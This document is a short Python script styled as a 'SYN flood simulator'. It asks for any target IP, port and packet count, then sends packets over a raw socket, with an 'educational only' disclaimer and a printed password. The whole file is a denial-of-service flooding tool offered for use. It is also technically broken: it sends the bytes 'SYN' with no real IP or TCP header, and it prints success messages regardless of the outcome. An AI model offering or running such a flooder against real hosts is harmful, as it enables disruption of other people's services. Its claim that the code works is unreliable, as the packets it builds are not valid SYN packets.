#!/usr/bin/env python3

"""
AURA SYN FLOOD SIMULATOR
⚠️ EDUCATIONAL PURPOSE ONLY - Test YOUR own servers only ⚠️
Requires root for raw sockets - may not work in Termux
Password: AuraV6
"""

import socket
import threading
import time
import sys

print("╔══════════════════════════════════════════════════════════════╗")
print("║              🔥 AURA SYN FLOOD SIMULATOR 🔥                  ║")
print("║           ⚠️  EDUCATIONAL PURPOSE ONLY ⚠️                    ║")
print("╚══════════════════════════════════════════════════════════════╝")
print("")

target_ip = input("Enter target IP (YOUR own server only): ")
target_port = int(input("Enter target port (e.g., 80): "))
packets = int(input("Enter number of packets to send: "))

print(f"\n🔥 Sending {packets} SYN packets to {target_ip}:{target_port}...")

def syn_flood():
    try:
        # Create raw socket (requires root)
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        for _ in range(packets):
            # Craft SYN packet (simplified)
            sock.sendto(b"SYN", (target_ip, target_port))
            print(f"✓ SYN packet {_+1} sent")
            time.sleep(0.001)
    except PermissionError:
        print("❌ Root required for SYN flood! Run with 'su' if you have root.")
    except Exception as e:
        print(f"❌ Error: {e}")

syn_flood()
print(f"\n✅ SYN flood simulation complete - {packets} packets sent")
print("🔐 Password: AuraV6")
